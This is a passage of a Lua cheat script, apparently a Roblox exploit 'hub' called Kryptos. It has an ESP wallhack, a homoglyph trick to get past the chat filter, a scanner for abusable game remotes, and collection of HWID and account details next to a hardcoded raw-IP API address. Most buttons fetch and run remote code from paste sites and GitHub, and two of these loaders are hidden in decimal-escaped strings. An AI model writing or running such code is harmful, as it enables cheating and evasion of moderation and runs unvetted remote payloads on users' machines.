KryptosAPI = "http://45.146.255.26:3297"
KryptosVersion = 'a1.5'

--[[
Time Wasted : 24:30HR
]]
--[[
   __ __              __          
  / //_/_____ _____  / /____  ___ 
 / ,< / __/ // / _ \/ __/ _ \/ _ \
/_/|_/_/  \_, / .__/\__/\___/_//_/
       /___/_/
> Kryptos | NON OPEN-SOURCED
]]
local executorName = tostring(identifyexecutor())
print("[Kry]: Kryptos HUB | Executor: " .. executorName)
--[] Arguments
local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/Seven7-lua/Roblox/refs/heads/main/Librarys/Orion/Orion.lua'))()
--[] Kryptos Locals
_G.CrosshairVisible = true
local Count = 1
local Parent = game:GetService("CoreGui"):FindFirstChild("TopBarApp"):FindFirstChild("TopBarFrame"):FindFirstChild("LeftFrame")
local GUI = Instance.new("ScreenGui", gethui())

--[[
function CreateIcon(IconID)
    local Image = Instance.new("ImageButton")
    Image.Parent = GUI
    Image.Name = "Background"
    Image.Image = "rbxasset://textures/ui/TopBar/iconBase.png"
    Image.Position = UDim2.fromOffset(Parent.ChatIcon.AbsolutePosition.X, Parent.ChatIcon.AbsolutePosition.Y) + UDim2.fromOffset(45 * Count, 5)
    Image.Size = UDim2.fromOffset(30, 30)
    Image.BackgroundTransparency = 1
    
    local Icon2 = Instance.new("ImageLabel")
    Icon2.Parent = Image
    Icon2.Image = IconID
    Icon2.Name = "Icon"
    Icon2.Size = UDim2.fromOffset(25, 25)
    Icon2.Position = UDim2.new(.5, 0, .5, 0)
    Icon2.AnchorPoint = Vector2.new(.5, .5)
    Icon2.BackgroundTransparency = 1
    
    Count += 1
    return Image
end

local isOn = false

if not _G.TopBarToggle then
CreateIcon("rbxassetid://7733771628").MouseButton1Click:Connect(function()
    isOn = not isOn
    if isOn then
        game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.RightShift,false,game)
        if gethui():FindFirstChild("Orion") then
          gethui().Orion.Enabled = not gethui().Orion.Enabled
        end
    else
        if gethui():FindFirstChild("Orion") then
          gethui().Orion.Enabled = not gethui().Orion.Enabled
        end
    end
    _G.TopBarToggle = true
end)
else
  print("TopbarToggle Alreadly On")
end
]]

local ProxyUrl = ""
local Players = game:GetService("Players")
local uis = game:GetService("UserInputService")
local ismobile = uis.TouchEnabled
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local Typing = false
local LogService = game:GetService("LogService")
local HttpService = game:GetService("HttpService")
UserInputService = game:GetService("UserInputService")
local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
local ID = game:GetService("Players").LocalPlayer.UserId
local PLAYERNAME = game:GetService("Players").LocalPlayer.Name
local GameID = tostring(game.PlaceId)
local LocalPlayer = game:GetService("Players").LocalPlayer.Name
local MembershipType = "a"
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local AccountAge = LocalPlayer.AccountAge
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

--[] Force Reset Character
local function forceResetAction()
    local player = game.Players.LocalPlayer
    if player.Character and player.Character:FindFirstChild("Humanoid") then
        player.Character.Humanoid.Health = 0
    end
end
--[] KryptosBypasserMsg
function SimpleBypass(FunctionMsg)
local letters = {
                ["a"] = "Α", ["A"] = "α",
                ["b"] = "Β", ["B"] = "b",
                ["c"] = "С", ["C"] = "с",
                ["d"] = "D", ["D"] = "ԁ",
                ["e"] = "Ε", ["E"] = "ȩ",
                ["f"] = "Ғ", ["F"] = "Ғ",
                ["g"] = "ԍ", ["G"] = "ԍ",
                ["h"] = "Η", ["H"] = "һ",
                ["i"] = "I", ["I"] = "i",
                ["j"] = "Ј", ["J"] = "ј",
                ["k"] = "Κ", ["K"] = "κ",
                ["l"] = "L", ["L"] = "L",
                ["m"] = "Μ", ["M"] = "м",
                ["n"] = "Ν", ["N"] = "n",
                ["o"] = "Ο", ["O"] = "ο",
                ["p"] = "Ρ", ["P"] = "р",
                ["q"] = "Ԛ", ["Q"] = "ԛ",
                ["r"] = "R", ["R"] = "r",
                ["s"] = "Ṡ", ["S"] = "ş",
                ["t"] = "Τ", ["T"] = "t",
                ["u"] = "ᴜ", ["U"] = "u",
                ["v"] = "Ѵ", ["V"] = "ѵ",
                ["w"] = "Ԝ", ["W"] = "ԝ",
                ["x"] = "Χ", ["X"] = "x",
                ["y"] = "Υ", ["Y"] = "y",
                ["z"] = "Ζ", ["Z"] = "ᴢ"
            }
-- The message to translate
SimpleBypassMessage = FunctionMsg

SimpleBypassMessage = tostring(SimpleBypassMessage)

local tcs = game:GetService("TextChatService")
local chat = tcs.ChatInputBarConfiguration.TargetTextChannel

local function sendchat(msg)
  if tcs.ChatVersion == Enum.ChatVersion.LegacyChatService then
    game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer(msg,"All")
   else
     chat:SendAsync(msg)
  end
end

local function translate(message)
    local translated = ""
    for i = 1, #message do
        local char = message:sub(i, i)
        translated = translated .. (letters[char] or char)
    end
    return translated
end

-- Print the translated message
local finalmsg = translate(SimpleBypassMessage)
sendchat(finalmsg)
end
--[] Esp
function Esp()
    _G.SendNotifications = false
    _G.DefaultSettings = false
    _G.TeamCheck = false
    _G.ESPVisible = nil
    _G.TextColor = Color3.fromRGB(255, 80, 10)
    _G.TextSize = 25
    _G.Center = true
    _G.Outline = true
    _G.OutlineColor = Color3.fromRGB(255, 255, 255)
    _G.TextTransparency = 1.7
    _G.TextFont = Drawing.Fonts.UI
    _G.DisableKey = nil
    
    local function CreateESP()
        for _, v in next, Players:GetPlayers() do
            if v.Name ~= Players.LocalPlayer.Name then
                local ESP = Drawing.new("Text")
    
                RunService.RenderStepped:Connect(function()
                    if workspace:FindFirstChild(v.Name) ~= nil and workspace[v.Name]:FindFirstChild("HumanoidRootPart") ~= nil then
                        local Vector, OnScreen = Camera:WorldToViewportPoint(workspace[v.Name]:WaitForChild("Head", math.huge).Position)
    
                        ESP.Size = _G.TextSize
                        ESP.Center = _G.Center
                        ESP.Outline = _G.Outline
                        ESP.OutlineColor = _G.OutlineColor
                        ESP.Color = _G.TextColor
                        ESP.Transparency = _G.TextTransparency
                        ESP.Font = _G.TextFont
    
                        if OnScreen == true then
                            local Part1 = workspace:WaitForChild(v.Name, math.huge):WaitForChild("HumanoidRootPart", math.huge).Position
                            local Part2 = workspace:WaitForChild(Players.LocalPlayer.Name, math.huge):WaitForChild("HumanoidRootPart", math.huge).Position or 0
                            local Dist = (Part1 - Part2).Magnitude
                            ESP.Position = Vector2.new(Vector.X, Vector.Y - 25)
                            ESP.Text = ("("..tostring(math.floor(tonumber(Dist)))..") "..v.Name.." ["..workspace[v.Name].Humanoid.Health.."]")
                            if _G.TeamCheck == true then 
                                if Players.LocalPlayer.Team ~= v.Team then
                                    ESP.Visible = _G.ESPVisible
                                else
                                    ESP.Visible = false
                                end
                            else
                                ESP.Visible = _G.ESPVisible
                            end
                        else
                            ESP.Visible = false
                        end
                    else
                        ESP.Visible = false
                    end
                end)
    
                Players.PlayerRemoving:Connect(function()
                    ESP.Visible = false
                end)
            end
        end
    
        Players.PlayerAdded:Connect(function(Player)
            Player.CharacterAdded:Connect(function(v)
                if v.Name ~= Players.LocalPlayer.Name then 
                    local ESP = Drawing.new("Text")
        
                    RunService.RenderStepped:Connect(function()
                        if workspace:FindFirstChild(v.Name) ~= nil and workspace[v.Name]:FindFirstChild("HumanoidRootPart") ~= nil then
                            local Vector, OnScreen = Camera:WorldToViewportPoint(workspace[v.Name]:WaitForChild("Head", math.huge).Position)
        
                            ESP.Size = _G.TextSize
                            ESP.Center = _G.Center
                            ESP.Outline = _G.Outline
                            ESP.OutlineColor = _G.OutlineColor
                            ESP.Color = _G.TextColor
                            ESP.Transparency = _G.TextTransparency
        
                            if OnScreen == true then
                                local Part1 = workspace:WaitForChild(v.Name, math.huge):WaitForChild("HumanoidRootPart", math.huge).Position
                                local Part2 = workspace:WaitForChild(Players.LocalPlayer.Name, math.huge):WaitForChild("HumanoidRootPart", math.huge).Position or 0
                                local Dist = (Part1 - Part2).Magnitude
                                ESP.Position = Vector2.new(Vector.X, Vector.Y - 25)
                                ESP.Text = ("("..tostring(math.floor(tonumber(Dist)))..") "..v.Name.." ["..workspace[v.Name].Humanoid.Health.."]")
                                if _G.TeamCheck == true then 
                                    if Players.LocalPlayer.Team ~= Player.Team then
                                        ESP.Visible = _G.ESPVisible
                                    else
                                        ESP.Visible = false
                                    end
                                else
                                    ESP.Visible = _G.ESPVisible
                                end
                            else
                                ESP.Visible = false
                            end
                        else
                            ESP.Visible = false
                        end
                    end)
        
                    Players.PlayerRemoving:Connect(function()
                        ESP.Visible = false
                    end)
                end
            end)
        end)
    end
    
    if _G.DefaultSettings == true then
        _G.TeamCheck = false
        _G.ESPVisible = true
        _G.TextColor = Color3.fromRGB(40, 90, 255)
        _G.TextSize = 14
        _G.Center = true
        _G.Outline = false
        _G.OutlineColor = Color3.fromRGB(0, 0, 0)
        _G.DisableKey = Enum.KeyCode.Q
        _G.TextTransparency = 0.75
    end
    
    UserInputService.TextBoxFocused:Connect(function()
        Typing = true
    end)
    
    UserInputService.TextBoxFocusReleased:Connect(function()
        Typing = false
    end)
    
    UserInputService.InputBegan:Connect(function(Input)
        if Input.KeyCode == _G.DisableKey and Typing == false then
            _G.ESPVisible = not _G.ESPVisible
            
            if _G.SendNotifications == true then
                game:GetService("StarterGui"):SetCore("SendNotification",{
                    Title = "Exunys Developer";
                    Text = "The ESP's visibility is now set to "..tostring(_G.ESPVisible)..".";
                    Duration = 5;
                })
            end
        end
    end)
    
    local Success, Errored = pcall(function()
        CreateESP()
    end)
    
    if Success and not Errored then
        if _G.SendNotifications == true then
            game:GetService("StarterGui"):SetCore("SendNotification",{
                Title = "Exunys Developer";
                Text = "ESP script has successfully loaded.";
                Duration = 5;
            })
        end
    elseif Errored and not Success then
        if _G.SendNotifications == true then
            game:GetService("StarterGui"):SetCore("SendNotification",{
                Title = "Exunys Developer";
                Text = "ESP script has errored while loading, please check the developer console! (F9)";
                Duration = 5;
            })
        end
        TestService:Message("The ESP script has errored, please notify Exunys with the following information :")
        warn(Errored)
        print("!! IF THE ERROR IS A FALSE POSITIVE (says that a player cannot be found) THEN DO NOT BOTHER !!")
    end
end

--[] Crosshair
function Crosshair()
    -- Check if Drawing API is available
    local function API_Check()
        if Drawing == nil then
            return false
        else
            return true
        end
    end

    -- Initialize Drawing API check
    if not API_Check() then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "KryptosReload";
            Text = "Crosshair script could not be loaded because your exploit is unsupported.";
            Duration = math.huge;
            Button1 = "OK"
        })
        return
    end

    -- Required services and variables
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local UserInputService = game:GetService("UserInputService")
    local Camera = workspace.CurrentCamera

    -- Global settings
    _G.SendNotifications = false
    _G.DefaultSettings = false
    _G.ToMouse = false
    _G.CrosshairSize = 20
    _G.CrosshairThickness = 1
    _G.CrosshairColor = Color3.fromRGB(255, 255, 255)
    _G.CrosshairTransparency = 1
    _G.DisableKey = Enum.KeyCode.Q

    -- Drawing setup
    local HorizontalLine = Drawing.new("Line")
    local VerticalLine = Drawing.new("Line")

    -- Function to update crosshair position and appearance
    local function UpdateCrosshair()
        local Real_Size = _G.CrosshairSize / 2

        HorizontalLine.Color = _G.CrosshairColor
        HorizontalLine.Thickness = _G.CrosshairThickness
        HorizontalLine.Visible = _G.CrosshairVisible
        HorizontalLine.Transparency = _G.CrosshairTransparency
        
        VerticalLine.Color = _G.CrosshairColor
        VerticalLine.Thickness = _G.CrosshairThickness
        VerticalLine.Visible = _G.CrosshairVisible
        VerticalLine.Transparency = _G.CrosshairTransparency
        
        if _G.ToMouse == true then
            local MouseLocation = UserInputService:GetMouseLocation()
            HorizontalLine.From = Vector2.new(MouseLocation.X - Real_Size, MouseLocation.Y)
            HorizontalLine.To = Vector2.new(MouseLocation.X + Real_Size, MouseLocation.Y)
            
            VerticalLine.From = Vector2.new(MouseLocation.X, MouseLocation.Y - Real_Size)
            VerticalLine.To = Vector2.new(MouseLocation.X, MouseLocation.Y + Real_Size)
        else
            local ViewportSize = Camera.ViewportSize / 2
            local Axis_X, Axis_Y = ViewportSize.X, ViewportSize.Y
            
            HorizontalLine.From = Vector2.new(Axis_X - Real_Size, Axis_Y)
            HorizontalLine.To = Vector2.new(Axis_X + Real_Size, Axis_Y)
        
            VerticalLine.From = Vector2.new(Axis_X, Axis_Y - Real_Size)
            VerticalLine.To = Vector2.new(Axis_X, Axis_Y + Real_Size)
        end
    end

    -- RenderStepped connection to update crosshair
    RunService.RenderStepped:Connect(UpdateCrosshair)

    -- Default settings initialization
    if _G.DefaultSettings == true then
        _G.CrosshairVisible = true
        _G.CrosshairSize = 25
        _G.CrosshairThickness = 1
        _G.CrosshairColor = Color3.fromRGB(255, 255, 255)
        _G.CrosshairTransparency = 0.15
        _G.DisableKey = Enum.KeyCode.Q
    end

    -- Input handlers
    local Typing = false

    UserInputService.TextBoxFocused:Connect(function()
        Typing = true
    end)

    UserInputService.TextBoxFocusReleased:Connect(function()
        Typing = false
    end)

    UserInputService.InputBegan:Connect(function(Input)
        if Input.KeyCode == _G.DisableKey and not Typing then
            _G.CrosshairVisible = not _G.CrosshairVisible
            
            if _G.SendNotifications then
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "KryptosReload";
                    Text = "The crosshair's visibility is now set to " .. tostring(_G.CrosshairVisible) .. ".";
                    Duration = 5;
                })
            end
        end
    end)
end

--[] Bypasser Functions
local UserInput = ""
local rawResponse = ""
local parsedStatus = ""
local parsedKey = ""
local parsedTime = ""
local parsedMessage = ""

local function fetchAndParseBypass(url)
    local success, response = pcall(function()
        return game:HttpGet(url)
    end)
    if success then
        rawResponse = response
        local parsedResponse = HttpService:JSONDecode(response)
        parsedStatus = parsedResponse.status or "No status provided"
        parsedKey = parsedResponse.result or "No key provided"
        parsedTime = parsedResponse.time or "No time provided"
        parsedMessage = parsedResponse.message or ""
        print("Status :" .. parsedStatus)
        print("Key :" .. parsedKey)
        print("Message" .. parsedTime)
        print("Time :" .. parsedTime)
        return true
    else
        warn("Failed to fetch URL:", response)
        rawResponse = "Failed to fetch URL: " .. tostring(response)
        return false
    end
end

--[] Vuln Checker
for i, v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
	if v.Name == "DestroySegway" or v.Name == "DeleteCar" or v.Name == "HandlessSegway" or v.Name == "Building Tools" or v.Name == "SetNetworkOwnership" or v.Name == "ChangeParent" or v.Name == "despawn" then
		OrionLib:MakeNotification({
			Name = "Kryptos",
			Content = "Vuln FOUND!",
			Image = "rbxassetid://4483345998",
			Time = 5
		})
		VulnGame = true
	end
end
--[] Kryptos Window
local Window = OrionLib:MakeWindow({
	Name = executorName .. " | Kryptos",
	HidePremium = false,
	IntroEnabled = true,
	IntroText = "Kryptos",
	IntroIcon = "rbxassetid://7733752575",
	SaveConfig = false,
	ConfigFolder = "Kryptos",
})

--[] Kryptos Notification
OrionLib:MakeNotification({
	Name = "Kryptos",
	Content = "Kryptos started successfully",
	Image = "rbxassetid://7733771628",
	Time = 5
})

function scriptnotify()
	OrionLib:MakeNotification({
		Name = "Kryptos",
		Content = "Script ran",
		Image = "rbxassetid://7733771628",
		Time = 5
	})
end

function scriptnotfound()
	OrionLib:MakeNotification({
		Name = "Kryptos",
		Content = "Script cannot be found ]:",
		Image = "rbxassetid://7733771628",
		Time = 5
	})
end

--[] Kryptos Tabs
local FeScriptTab = Window:MakeTab({
	Name = "FE Scripts",
	Icon = "rbxassetid://6026568213",
	PremiumOnly = false
})

local CharacterTab = Window:MakeTab({
	Name = "Character",
	Icon = "rbxassetid://6034287594",
	PremiumOnly = false
})


local AnimationTab = Window:MakeTab({
	Name = "Animation",
	Icon = "rbxassetid://7743871002",
	PremiumOnly = false
})

local GameHubTab = Window:MakeTab({
	Name = "Game Hub's",
	Icon = "rbxassetid://7733799901",
	PremiumOnly = false
})

local UniversalHubTab = Window:MakeTab({
	Name = "Universal Hub's",
	Icon = "rbxassetid://7733954760",
	PremiumOnly = false
})

local TrollTab = Window:MakeTab({
	Name = "Troll",
	Icon = "rbxassetid://7733741741",
	PremiumOnly = false
})

local ServerTab = Window:MakeTab({
	Name = "Server",
	Icon = "rbxassetid://7734053426",
	PremiumOnly = false
})

local AdminTab = Window:MakeTab({
	Name = "Admin",
	Icon = "rbxassetid://7734056608",
	PremiumOnly = false
})

local PlayerTab = Window:MakeTab({
	Name = "Player",
	Icon = "rbxassetid://7743875962",
	PremiumOnly = false
})

local DebuggingTab = Window:MakeTab({
	Name = "Debugging",
	Icon = "rbxassetid://7743872929",
	PremiumOnly = false
})

local SettingsTab = Window:MakeTab({
	Name = "Settings",
	Icon = "rbxassetid://7734053495",
	PremiumOnly = false
})

local InfoTab = Window:MakeTab({
	Name = "Info",
	Icon = "rbxassetid://7743866778",
	PremiumOnly = false
})

local MiscTab = Window:MakeTab({
	Name = "Misc",
	Icon = "rbxassetid://7733793319",
	PremiumOnly = false
})

local AiTab = Window:MakeTab({
  Name = "AI",
  Icon = "rbxassetid://7733916988",
  PremiumOnly = false
})


--[] Kryptos | Fe script

FeScriptTab:AddParagraph("Important!","All of these FE Scripts do require hats. The link to the hats will be copied to your clipboard once you click the button(s). If the script doesnt work make sure your wearing the right hats! Also use fluxus to have better experience with these scripts.")

local Section = FeScriptTab:AddSection({
	Name = "FE Event Hats"
})


FeScriptTab:AddButton({
	Name = "DinoBlox [R6 Only]",
	Callback = function()
	        OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/5Kt42cfe",
	Image = "rbxassetid://4483345998",
	Time = 5
})
setclipboard(tostring('https://pastebin.com/raw/5Kt42cfe'))
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/KRNL2/fedinoblox/main/nonoti'),true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Ice Cream [R6 Only]",
	Callback = function()
	        OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://www.roblox.com/catalog/9560392730/Ice-Cold-Shaved-Ice",
	Image = "rbxassetid://4483345998",
	Time = 5
})
  	OrionLib:MakeNotification({
	Name = "Controls!",
	Content = "E to lick ice cream and Q to stop licking",
	Image = "rbxassetid://4483345998",
	Time = 5
})
setclipboard(tostring('https://www.roblox.com/catalog/9560392730/Ice-Cold-Shaved-Ice'))
    --hats
--https://www.roblox.com/catalog/9560392730/Ice-Cold-Shaved-Ice

--controls :
--E : To lick ice cream 
--Q : To stop licking 

loadstring(game:HttpGet("https://raw.githubusercontent.com/PYXDYT/FE-ICE-CREAM/main/V1"))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Jet V1 [R6 Only]",
	Callback = function()
	        OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/QqbZtXMj",
	Image = "rbxassetid://4483345998",
	Time = 5
})
    setclipboard(tostring('https://pastebin.com/raw/QqbZtXMj'))
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/jetv1/main/script'))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Blue Flame Hoverboard [R6 Only]",
	Callback = function()
	        OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/TCKUyjx7",
	Image = "rbxassetid://4483345998",
	Time = 5
})
setclipboard(tostring('https://pastebin.com/raw/TCKUyjx7'))
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/KRNL2/bluehoverboard/main/fescript'),true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Sofa Pc [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/XjdFXGdw",
	Image = "rbxassetid://4483345998",
	Time = 5
})
setclipboard(tostring('https://pastebin.com/raw/XjdFXGdw'))
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/KRNL2/pcsofa/main/scriptverycool'),true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Eiffel Tower [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/skJetUDu",
	Image = "rbxassetid://4483345998",
	Time = 5
})
setclipboard(tostring('https://pastebin.com/raw/skJetUDu'))
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PYXDYT/FE-TOWER/main/V1"))()
  	end    
})


FeScriptTab:AddButton({
	Name = "BMX Ride V2 [R6 Only]",
	Callback = function()
      		OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/aX8J7W82",
	Image = "rbxassetid://4483345998",
	Time = 5
})
setclipboard(tostring('https://pastebin.com/raw/aX8J7W82'))
loadstring(game:HttpGet(('https://pastefy.ga/6SiK0qV3/raw'),true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Cursed Bat Cube [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/npFNxgQC",
	Image = "rbxassetid://4483345998",
	Time = 5
})
setclipboard(tostring('https://pastebin.com/raw/npFNxgQC'))	    
    loadstring(game:HttpGet(('https://pastefy.ga/UfJvPD1G/raw'),true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Hoverboard V2 [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/tCf161BV",
	Image = "rbxassetid://4483345998",
	Time = 5
})
setclipboard(tostring('https://pastebin.com/raw/tCf161BV'))
    OrionLib:MakeNotification({
	Name = "Controls!",
	Content = "Modes: Q & E",
	Image = "rbxassetid://4483345998",
	Time = 5
})
loadstring(game:HttpGet(('https://pastebin.com/raw/YLv2KSZj'),true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Big Boy [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://www.roblox.com/catalog/9661543986/Nike-Shoebox-Costume",
	Image = "rbxassetid://4483345998",
	Time = 5
})
setclipboard(tostring('https://www.roblox.com/catalog/9661543986/Nike-Shoebox-Costume'))
    loadstring(game:HttpGet('https://paste.ee/r/gQOXW', true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Ghast [R6 Only]",
	Callback = function()
      		OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/VJU8brdw",
	Image = "rbxassetid://4483345998",
	Time = 5
})
setclipboard(tostring('https://pastebin.com/raw/VJU8brdw'))
loadstring(game:HttpGet('https://pastefy.ga/zFn0z6VV/raw'))()
      		
  	end    
})


FeScriptTab:AddButton({
	Name = "Blue Flame Power [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/KF1PBAQg",
	Image = "rbxassetid://4483345998",
	Time = 5
})
setclipboard(tostring('https://pastebin.com/raw/KF1PBAQg'))	    
      		loadstring("\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\83\116\97\114\116\101\114\71\117\105\34\41\58\83\101\116\67\111\114\101\40\34\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110\34\44\32\123\32\10\9\84\105\116\108\101\32\61\32\34\77\97\100\101\32\66\121\32\73\109\32\80\97\116\114\105\99\107\34\59\10\9\84\101\120\116\32\61\32\34\34\59\10\9\73\99\111\110\32\61\32\34\34\125\41\10\68\117\114\97\116\105\111\110\32\61\32\49\54\59\10\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\103\97\47\111\57\90\104\120\107\81\48\47\114\97\119\39\41\44\116\114\117\101\41\41\40\41\10")()
  	end    
})


FeScriptTab:AddButton({
	Name = "Hog Rider [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/j2vnk0vJ",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://pastebin.com/raw/j2vnk0vJ'))	    
      		loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/pigr/main/hogrider'))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Flying Umbrella [R6 Only]",
	Callback = function()
      	OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://www.roblox.com/catalog/9350274205/Vans-Black-White-Checkerboard-Umbrella",
	Image = "rbxassetid://4483345998",
	Time = 5
})	
     	setclipboard(tostring('https://www.roblox.com/catalog/9350274205/Vans-Black-White-Checkerboard-Umbrella'))		
      loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/FEFlyingUmbrella/main/source'))()		
  	end    
})


FeScriptTab:AddButton({
	Name = "Katana [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://www.roblox.com/catalog/7548993875/Slasher",
	Image = "rbxassetid://4483345998",
	Time = 5
})
setclipboard(tostring('https://www.roblox.com/catalog/7548993875/Slasher'))    
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\103\105\116\104\117\98\46\99\111\109\47\73\99\121\49\82\90\47\56\117\103\106\115\108\97\115\104\101\114\99\111\110\118\101\114\116\54\55\102\121\118\104\98\106\118\104\98\113\102\115\100\120\47\114\97\119\47\109\97\105\110\47\55\103\117\98\106\110\105\118\56\121\55\116\103\121\98\117\106\105\56\54\102\103\121\98\39\41\41\40\41\10")()
  	end    
})

FeScriptTab:AddButton({
	Name = "Sad Boy [R6 & R15]",
	Callback = function()
	   OrionLib:MakeNotification({
	Name = "No necessary hats or items needed",
	Content = "No necessary hats or items needed",
	Image = "rbxassetid://4483345998",
	Time = 5
})
    loadstring(game:HttpGet("https://pastebin.com/raw/hgPJbwF0"))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Pet Dog [R6 & R15]",
	Callback = function()
	   OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/Fsf3rujC",
	Image = "rbxassetid://4483345998",
	Time = 5
})
    setclipboard(tostring('https://pastebin.com/raw/Fsf3rujC'))     
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KRNL2/petdog/main/feop"))()		
  	end    
})


FeScriptTab:AddButton({
	Name = "Rocket [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://raw.githubusercontent.com/KRNL2/ferocket/main/hats",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://raw.githubusercontent.com/KRNL2/ferocket/main/hats'))
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KRNL2/ferockett/main/source"))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Giant Cube Man [R6 Only]",
	Callback = function()
    	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://raw.githubusercontent.com/KRNL2/giantcubeman/main/hats",
	Image = "rbxassetid://4483345998",
	Time = 5
})
    	setclipboard(tostring('https://raw.githubusercontent.com/KRNL2/giantcubeman/main/hats'))
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KRNL2/giantcubemana/main/source"))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Hoverskater [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/qXa2jMnL",
	Image = "rbxassetid://4483345998",
	Time = 5
})
    setclipboard(tostring('https://pastebin.com/raw/qXa2jMnL'))
    --Fe blue flame hoverboard
--https://www.roblox.com/catalog/6470135113/Fan-Hand-Sign-Why-Dont-We-WDW
--https://www.roblox.com/catalog/9560383533/Blue-Flame-Robo-Samurai
--[GET THIS HAT BEFORE JULY 8TH]

loadstring(game:HttpGet(('https://pastebin.com/raw/U2VHEdFB'),true))()
  	end    
})


----------------------------------------------------------------------------------
-- New section --
-- FE Free Hats --
----------------------------------------------------------------------------------
local Section = FeScriptTab:AddSection({
	Name = "FE Free Hats"
})


FeScriptTab:AddButton({
	Name = "Zombie [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/rFiVzH3Q",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	    setclipboard(tostring('https://pastebin.com/raw/rFiVzH3Q')) 
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KRNL2/FEZOM/main/zombie"))();
  	end    
})


FeScriptTab:AddButton({
	Name = "Gun [R6]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/prWGNSPB",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://pastebin.com/raw/prWGNSPB'))     
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KRNL2/gun/main/m40gun"))();
  	end    
})


FeScriptTab:AddButton({
	Name = "Soccer Ball [R15 & R6]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/bWXNFt7T",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	    	setclipboard(tostring('https://pastebin.com/raw/bWXNFt7T'))
